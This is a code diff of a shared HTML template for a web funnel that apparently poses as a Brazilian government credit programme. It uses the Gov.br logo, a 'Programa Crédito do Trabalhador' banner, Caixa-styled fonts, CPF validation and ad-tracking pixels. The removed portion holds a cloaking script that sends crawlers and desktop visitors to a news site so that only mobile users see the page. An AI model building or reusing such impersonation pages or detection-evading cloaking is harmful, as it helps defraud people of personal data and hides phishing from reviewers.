@@ -1,266 +1,224 @@
-<!-- Arquivo de recursos compartilhados para incluir via Jinja2 -->
+<!-- Recursos compartilhados para todas as páginas do funil -->
 
-<!-- Meta tags comuns -->
-<meta charset="utf-8"/>
-<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<!-- Meta tags básicas -->
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
 
-<!-- CSS externo -->
-<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
-<script src="https://cdn.tailwindcss.com"></script>
+<!-- CSS compartilhados -->
+<link rel="stylesheet" href="{{ url_for('static', filename='css/caixa-fonts.css') }}">
 
-<!-- Script de proteção da página -->
+<!-- Rastreadores UTM e integração com Utmify -->
+<script src="{{ url_for('static', filename='js/utm_tracker.js') }}"></script>
+<script src="{{ url_for('static', filename='js/utmify_helper.js') }}"></script>
+
+<!-- Script para capturar parâmetros UTM e propagá-los entre páginas -->
 <script>
-// Função para detectar se é um dispositivo móvel
-function isMobile() {
-  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-}
-
-// Função para detectar se é um bot
-function isBot() {
-  const botAgents = [
-    'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
-    'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
-  ];
-
-  return botAgents.some(bot => navigator.userAgent.includes(bot));
-}
-
-// Função para verificar se a largura da janela é maior que 768px
-function isWideScreen() {
-  return window.innerWidth > 768;
-}
-
-// Redirecionar ou bloquear o acesso
-function checkAccess() {
-  if (isBot() || (!isMobile() && isWideScreen())) {
-    // Redirecionar para o site G1 se o acesso for bloqueado
-    window.location.href = "https://g1.globo.com/";
+  // Função para obter parâmetros da URL
+  function getUrlParameters() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const params = {};
+    
+    for (const [key, value] of urlParams.entries()) {
+      params[key] = value;
+    }
+    
+    return params;
   }
-}
+  
+  // Função para salvar parâmetros no localStorage
+  function saveParameters() {
+    const params = getUrlParameters();
+    
+    // Salvar todos os parâmetros no localStorage
+    if (Object.keys(params).length > 0) {
+      localStorage.setItem('allUrlParams', JSON.stringify(params));
+      console.log('Parâmetros salvos:', params);
+    }
+  }
+  
+  // Função para adicionar parâmetros UTM a uma URL
+  function appendUrlParams(url, extraParams = {}) {
+    // Obter parâmetros armazenados
+    let params = {};
+    
+    const storedParams = localStorage.getItem('allUrlParams');
+    if (storedParams) {
+      try {
+        params = JSON.parse(storedParams);
+      } catch(e) {
+        console.error('Erro ao analisar parâmetros armazenados:', e);
+      }
+    }
+    
+    // Mesclar com os parâmetros extras fornecidos
+    params = {...params, ...extraParams};
+    
+    // Se não há parâmetros, retorna a URL original
+    if (Object.keys(params).length === 0) {
+      return url;
+    }
+    
+    // Criar URL Search Params para construir a string de consulta
+    const urlSearchParams = new URLSearchParams();
+    for (const [key, value] of Object.entries(params)) {
+      if (value) {
+        urlSearchParams.append(key, value);
+      }
+    }
+    
+    // Adicionar os parâmetros à URL
+    const separator = url.includes('?') ? '&' : '?';
+    return url + separator + urlSearchParams.toString();
+  }
+  
+  // Função para redirecionar preservando parâmetros UTM
+  function redirectWithUtm(url, extraParams = {}) {
+    window.location.href = appendUrlParams(url, extraParams);
+  }
 
-// Executar a função de verificação ao carregar a página
-window.onload = checkAccess;
-
-// Adicionar um listener para verificar novamente se a janela for redimensionada
-window.addEventListener('resize', checkAccess);
+  // Executar quando o DOM estiver carregado
+  document.addEventListener('DOMContentLoaded', function() {
+    // Salvar parâmetros da URL atual
+    saveParameters();
+    
+    // Adicionar parâmetros UTM a todos os links na página
+    const links = document.querySelectorAll('a:not([data-no-utm])');
+    links.forEach(link => {
+      const href = link.getAttribute('href');
+      if (href && !href.startsWith('#') && !href.startsWith('javascript:') && !href.startsWith('tel:') && !href.startsWith('mailto:')) {
+        link.setAttribute('href', appendUrlParams(href));
+      }
+    });
+    
+    // Adicionar parâmetros UTM a todos os formulários na página
+    const forms = document.querySelectorAll('form:not([data-no-utm])');
+    forms.forEach(form => {
+      form.addEventListener('submit', function(e) {
+        const params = JSON.parse(localStorage.getItem('allUrlParams') || '{}');
+        
+        // Para cada parâmetro UTM, adicionar um campo oculto ao formulário
+        for (const [key, value] of Object.entries(params)) {
+          // Verificar se já existe um campo para este parâmetro
+          let input = form.querySelector(`input[name="${key}"]`);
+          
+          if (!input && value) {
+            // Se não existir, criar um novo campo oculto
+            input = document.createElement('input');
+            input.type = 'hidden';
+            input.name = key;
+            form.appendChild(input);
+          }
+          
+          if (input && value) {
+            input.value = value;
+          }
+        }
+      });
+    });
+  });
 </script>
 
-<!-- CSS comum -->
-<style>
-    @font-face {
-        font-family: 'Rawline';
-        src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
-        font-weight: 400;
-        font-style: normal;
+<!-- Funções utilitárias compartilhadas -->
+<script>
+  // Função para validar CPF
+  function validarCPF(cpf) {
+    cpf = cpf.replace(/[^\d]/g, ''); // Remove caracteres não numéricos
+    
+    if (cpf.length !== 11) return false;
+    
+    // Verifica se todos os dígitos são iguais
+    if (/^(\d)\1+$/.test(cpf)) return false;
+    
+    // Validação dos dígitos verificadores
+    let soma = 0;
+    let resto;
+    
+    for (let i = 1; i <= 9; i++) {
+      soma += parseInt(cpf.substring(i-1, i)) * (11 - i);
     }
-    @font-face {
-        font-family: 'Rawline';
-        src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
-        font-weight: 600;
-        font-style: normal;
+    
+    resto = (soma * 10) % 11;
+    if (resto === 10 || resto === 11) resto = 0;
+    if (resto !== parseInt(cpf.substring(9, 10))) return false;
+    
+    soma = 0;
+    for (let i = 1; i <= 10; i++) {
+      soma += parseInt(cpf.substring(i-1, i)) * (12 - i);
     }
-    @font-face {
-        font-family: 'Rawline';
-        src: url("{{ url_for('static', filename='fonts/rawline-700.1c7c76152b40409f.woff2') }}") format('woff2');
-        font-weight: 700;
-        font-style: normal;
+    
+    resto = (soma * 10) % 11;
+    if (resto === 10 || resto === 11) resto = 0;
+    if (resto !== parseInt(cpf.substring(10, 11))) return false;
+    
+    return true;
+  }
+  
+  // Formatação de CPF
+  function formatarCPF(cpf) {
+    cpf = cpf.replace(/[^\d]/g, '');
+    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+  }
+  
+  // Formatação de telefone
+  function formatarTelefone(telefone) {
+    telefone = telefone.replace(/[^\d]/g, '');
+    if (telefone.length === 11) {
+      return telefone.replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
+    } else if (telefone.length === 10) {
+      return telefone.replace(/(\d{2})(\d{4})(\d{4})/, '($1) $2-$3');
     }
-    * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-        font-family: 'Rawline', sans-serif;
+    return telefone;
+  }
+  
+  // Função para mostrar mensagem de erro
+  function mostrarErro(mensagem, elementoId = 'mensagem-erro') {
+    const elemento = document.getElementById(elementoId);
+    if (elemento) {
+      elemento.textContent = mensagem;
+      elemento.style.display = 'block';
+      setTimeout(() => {
+        elemento.style.display = 'none';
+      }, 5000);
+    } else {
+      alert(mensagem);
     }
-    body {
-        background-color: white;
-        padding-top: 60px;
-        color: #333333;
-        font-size: 16px;
-        line-height: 1.05;
-        min-height: 100vh;
-        display: flex;
-        flex-direction: column;
+  }
+  
+  // Função para mostrar mensagem de sucesso
+  function mostrarSucesso(mensagem, elementoId = 'mensagem-sucesso') {
+    const elemento = document.getElementById(elementoId);
+    if (elemento) {
+      elemento.textContent = mensagem;
+      elemento.style.display = 'block';
+      setTimeout(() => {
+        elemento.style.display = 'none';
+      }, 5000);
     }
-    .header {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        padding: 8px 20px;
-        background-color: white;
-        position: fixed;
-        top: 0;
-        left: 0;
-        right: 0;
-        z-index: 1000;
-        box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-        height: 60px;
-    }
-    .logo {
-        width: 100px; /* Reduced logo size */
-        height: auto;
-    }
-    .header-icons {
-        display: flex;
-        gap: 15px;
-    }
-    .header-icon {
-        font-size: 18px;
-        color: #1351b4;
-    }
-    .container {
-        max-width: 800px;
-        margin: 40px auto;
-        padding: 0 20px;
-        flex: 1;
-    }
-    .info-box {
-        border-left: 4px solid #1351b4; /* Changed color */
-        padding: 20px;
-        margin-bottom: 30px;
-        border-radius: 4px;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        height: auto; /* Removed fixed height */
-    }
-    .info-box h2 {
-        color: #1351b4; /* Changed color */
-        font-size: 20px;
-        font-weight: 600;
-        margin-bottom: 15px;
-    }
-    .info-box p {
-        color: #333;
-        line-height: 1.5;
-        margin-bottom: 10px;
-    }
-    .submit-button {
-        width: 100%;
-        padding: 12px;
-        background-color: #1351b4; /* Changed color */
-        color: white;
-        border: none;
-        border-radius: 4px;
-        font-weight: 600;
-        font-size: 16px;
-        cursor: pointer;
-        transition: all 0.3s ease;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 8px;
-    }
-    .submit-button:hover {
-        background-color: #092555;
-        transform: translateY(-1px);
-        box-shadow: 0 4px 6px rgba(19, 81, 180, 0.2); /* Changed color */
-    }
-    .footer {
-        background-color: #1351b4; /* Changed color */
-        color: white;
-        padding: 16px;
-        text-align: center;
-        margin-top: 40px;
-    }
+  }
+</script>
 
-    /* Estilos para a análise de CPF */
-    .user-data {
-        background: #1451B4;
-        padding: 15px;
-        border-radius: 4px;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
-        margin-bottom: 20px;
-        color: white;
-    }
-    .user-data-item {
-        font-weight: 700;
-        margin-bottom: 10px;
-        font-size: 15px;
-        color: white;
-        display: flex;
-        align-items: center;
-        text-shadow: 0 1px 2px rgba(0,0,0,0.2);
-    }
-    .user-data-item i {
-        margin-right: 10px;
-        width: 20px;
-        text-align: center;
-        color: white;
-    }
-    .analysis-container {
-        margin: 20px 0;
-    }
-    .analysis-step {
-        padding: 12px 15px;
-        margin: 8px 0;
-        border-left: 3px solid #1351b4; /* Changed color */
-        background: #f8f9fa;
-        border-radius: 4px;
-        opacity: 0;
-        transform: translateX(-20px);
-        animation: slideIn 0.8s ease forwards;
-    }
-    .analysis-step div {
-        line-height: 1.2;
-    }
-    .progress-bar {
-        height: 4px;
-        background: #e9ecef;
-        border-radius: 2px;
-        margin-top: 4px;
-        overflow: hidden;
-    }
-    .progress-bar-fill {
-        height: 100%;
-        background: #1351b4; /* Changed color */
-        width: 0;
-        animation: progressFill 2s ease-in-out;
-    }
-    @keyframes progressFill {
-        from { width: 0; }
-        to { width: 100%; }
-    }
-    @keyframes slideIn {
-        from {
-            opacity: 0;
-            transform: translateX(-20px);
-        }
-        to {
-            opacity: 1;
-            transform: translateX(0);
-        }
-    }
+<!-- Inclusão condicional do Google Tag Manager (se definido) -->
+{% if config.get('GTM_ID') %}
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','{{ config.get("GTM_ID") }}');</script>
+{% endif %}
 
-    /* Estilos para opções de empréstimo */
-    .select-loan {
-        width: 100%; 
-        padding: 10px; 
-        background-color: #1351b4; 
-        color: white; 
-        border: none; 
-        border-radius: 4px; 
-        font-weight: 600; 
-        cursor: pointer; 
-        transition: background-color 0.3s ease;
-    }
-    .select-loan:hover {
-        background-color: #092555;
-    }
-    @keyframes pulseButton {
-        0% { transform: scale(1); }
-        50% { transform: scale(1.02); }
-        100% { transform: scale(1); }
-    }
-</style>
-
-<!-- Estrutura de cabeçalho comum para todas as páginas -->
-<div class="header">
-    <img alt="Logo Gov.br" class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/11/Gov.br_logo.svg/2560px-Gov.br_logo.svg.png"/>
-    <div class="header-icons">
-        <i class="fas fa-search header-icon"></i>
-        <i class="fas fa-question-circle header-icon"></i>
-        <i class="fas fa-adjust header-icon"></i>
-    </div>
-</div>
-
-<div style="width: 100%; background-color: #1351b4; color: white; padding: 8px; text-align: center; font-weight: 500;">
-    Programa Crédito do Trabalhador - Lei nº 14.436/2025
-</div> 
+<!-- Inclusão condicional do Facebook Pixel (se definido) -->
+{% if config.get('FB_PIXEL_ID') %}
+<script>
+!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
+n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
+document,'script','https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '{{ config.get("FB_PIXEL_ID") }}');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id={{ config.get('FB_PIXEL_ID') }}&ev=PageView&noscript=1"
+/></noscript>
+{% endif %}
